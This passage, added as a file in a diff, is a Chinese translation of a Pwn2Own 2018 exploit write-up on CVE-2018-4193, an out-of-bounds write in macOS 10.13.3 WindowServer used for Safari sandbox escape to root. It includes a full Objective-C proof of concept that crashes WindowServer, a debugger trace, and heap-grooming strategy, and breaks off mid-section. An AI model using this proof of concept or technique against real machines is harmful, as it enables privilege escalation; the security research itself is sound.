@@ -1,0 +1,100 @@
+原文：
+作为Pwn2Own 2018系列文章的第六篇，同时也是最后一篇，本文将详实记录为了利用macOS
+WindowServer漏洞，我们为武器化CVE-2018-4193漏洞所历经的漫长而曲折的道路。作为一种基于内存破坏技术的提权方法（获取root权限），它将以零日漏洞攻击的形式来实现macOS
+10.13.3平台的Safari沙箱逃逸。
+首先，我们将描述现有漏洞的限制。接着，介绍用于发现与我们的漏洞兼容的破坏目标的工具和技术，然后，详细介绍为Pwn2Own
+2018开发的漏洞利用程序。最后，为了回馈安全社区，我们在文章末尾处给出了完整的漏洞利用源码，以便为社区构建出更好的漏洞利用技术增砖添瓦。
+利用macOS 10.13.3 WindowServer漏洞提权至root权限的动态演示
+**POC**
+* * *
+在[上一篇文章](https://blog.ret2.io/2018/07/25/pwn2own-2018-safari-sandbox/
+"上一篇文章")中，通过我们的进程内WindowServer
+fuzzer发现了一个bug，根据我们的推测，这个bug可能会导致一个可利用的越界(OOB)写漏洞。这个漏洞的[根本原因](https://blog.ret2.io/2018/07/25/pwn2own-2018-safari-sandbox/#discovery--root-cause-analysis
+"根本原因")是在函数_CGXRegisterForKey()中存在一个典型的有符号/无符号整数比较问题，该函数是macOS
+WindowServer中的一个mach消息处理程序。
+为了更好地研究各种崩溃（或其他异常程序行为）行为，首先要做的事情就是构建可靠且最小化的概念验证（PoC）代码。下面提供的代码是我们为了演示发现的漏洞而构建的最小的独立PoC：
+    // CVE-2018-4193 Proof-of-Concept by Ret2 Systems, Inc.
+    // compiled with: clang -framework Foundation -framework Cocoa poc.m -o poc
+    #import 
+    #import 
+    int (*CGSNewConnection)(int, int *);
+    int (*SLPSRegisterForKeyOnConnection)(int, void *, unsigned int, bool);
+    void resolve_symbols()
+    {
+        void *handle_CoreGraphics = dlopen(
+            "/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics",
+            RTLD_GLOBAL | RTLD_NOW
+        );
+        void *handle_SkyLight = dlopen(
+            "/System/Library/PrivateFrameworks/SkyLight.framework/SkyLight",
+            RTLD_GLOBAL | RTLD_NOW
+        );
+        CGSNewConnection = dlsym(handle_CoreGraphics, "CGSNewConnection");
+        SLPSRegisterForKeyOnConnection = dlsym(handle_SkyLight, "SLPSRegisterForKeyOnConnection");
+        dlclose(handle_CoreGraphics);
+        dlclose(handle_SkyLight);
+    }
+    int main()
+    {
+        int cid = 0;
+        uint32_t result = 0;
+        printf("[+] Resolving symbols...\n");
+        resolve_symbols();
+        printf("[+] Registering with WindowServer...\n");
+        NSApplicationLoad();
+        result = CGSNewConnection(0, &cid);
+        if(result == 1000)
+        {
+            printf("[-] WindowServer not yet initialized... \n");
+            return 1;
+        }
+        ProcessSerialNumber psn;
+        psn.highLongOfPSN = 1;
+        psn.lowLongOfPSN = getpid();
+        printf("[+] Triggering the bug...\n");
+        uint32_t BUG = 0x80000000 | 0x41414141;
+        result = SLPSRegisterForKeyOnConnection(cid, &psn, BUG, 1);
+        return 0;
+    }
+除了完成与WindowServer通信所需的自举操作之外，这个PoC的功能实际上非常简单：只是调用由SkyLight私有框架导出的函数SLPSRegisterForKeyOnConnection()，而该函数中包含一个恶意构造的参数，该参数名为BUG。
+当从用户进程调用SLPSRegisterForKeyOnConnection()时，mach_msg将通过machi
+IPC发送到WindowServer，其中的消息是由错误处理程序_XRegisterForKey()进行处理的。这是一个我们可以从Safari的沙箱化（但[遭到破坏](https://blog.ret2.io/2018/07/11/pwn2own-2018-jsc-exploit/ "遭到破坏")）的实例中自由调用的API：
+Safari和WindowServer之间的Mach IPC的高级描述
+如果以非特权用户身份编译和运行该PoC的话，会使作为root级别的系统服务在Safari Sandbox外部运行的WindowServer立即崩溃：
+    markus-mac-vm:poc user$ clang -framework Foundation -framework Cocoa poc.m -o poc
+    markus-mac-vm:poc user$ ./poc
+    [+] Registering with WindowServer...
+    [+] Resolving symbols...
+    [+] Triggering the bug...
+我们的新PoC导致的崩溃反映了我们在前一篇文章中[重放位翻转](https://blog.ret2.io/2018/07/25/pwn2own-2018-safari-sandbox/#discovery--root-cause-analysis
+"重放位翻转")时看到的情况。并且，导致崩溃的越界读取漏洞，在适当条件下可能引发越界写入漏洞。
+    Process 77180 stopped
+    * thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (address=0x7fd68940f7d8)
+        frame #0: 0x00007fff55c6f677 SkyLight`_CGXRegisterForKey + 214
+    SkyLight`_CGXRegisterForKey:
+    ->  0x7fff55c6f677 : mov    rax, qword ptr [rcx + 8*r13 + 0x8]
+        0x7fff55c6f67c : test   rax, rax
+        0x7fff55c6f67f : je     0x7fff55c6f6e9            ; 
+        0x7fff55c6f681 : xor    ecx, ecx
+    Target 0: (WindowServer) stopped.
+在下一节中，我们将讨论使这个WindowServer漏洞难以利用的一些约束因素。
+**该漏洞的约束条件**
+* * *
+乍一看，这个漏洞似乎很适合利用：这是一个相对较浅的错误（易于触发），并可以通过完全处于我们的控制之下的越界索引来提供粗略的写入功能。但是，我们只能做到指定恶意索引，却无法真正控制将要写入的数据：
+在攻击者控制的越界索引处可能会写入未知值（r15，ecx）
+通过仔细研究完成写操作的代码路径，我们发现它受到以下特性的约束:
+  1. 写入操作是“粗略的”，因为它是24字节对齐的（例如，index*24）
+  2. 要想触发写入操作的代码路径，必须满足两个先决条件（约束）
+  3. 我们几乎无法控制待写入的值
+第一个特性（24字节对齐）可以通过以下事实来解释：攻击者控制的索引通常用于索引由六个（未知）结构（大小为24字节）组成的数组。不过，这倒不是什么大问题。
+事实证明，第二个特性是最令人头疼的，它要求越界索引周围的内存满足执行写操作的某些限制。下面的伪代码图详细描述了这些约束:
+这两个约束使得触发越界写入操作变得非常棘手
+该漏洞的第三个特性是，我们无法控制写入目标的值。具体来说，这个代码路径通常用于将堆指针存储到未知结构中。同时，这些代码还会直接在指针字段之后存储一个DWORD，而它恰好是我们连接WindowServer的ConnectionID（CID）。
+由于这些限制因素的存在，使得为该漏洞寻找有趣且兼容的破坏目标（对象，分配空间）变得非常棘手。
+**内存的破坏方法**
+* * *
+我们的第一种方法是，考察WindowServer及其沙箱可访问的接口，以寻找这样的对象：可以通过为其分配并“揉捏”内存，从而满足触发写入操作所需的约束条件。经过观察，我们确定了一些候选结构，但它们大多无法提供符合要求的相邻字段来供我们破坏。
+通过“揉捏”WindowServer对象的内部状态来满足我们的约束条件（橙色）
+实际上，这种做法有误导的嫌疑，因为它在实现必要的约束条件着力过多，而很少关注实际上会被破坏的东西。不久之后，我们就放弃了这种策略，转而采用第二种方法。
+第二种方法是建立在这样的假设之上的：借助WindowServer堆风水技术，我们将能够在攻击者控制的分配空间之后直接放上我们感兴趣的任意分配空间，从而满足我们的写代码路径所需的约束条件。在对齐后，相邻的分配空间将如下所示：
+仔细将攻击者控制的分配空间与受害者的分配空间对齐
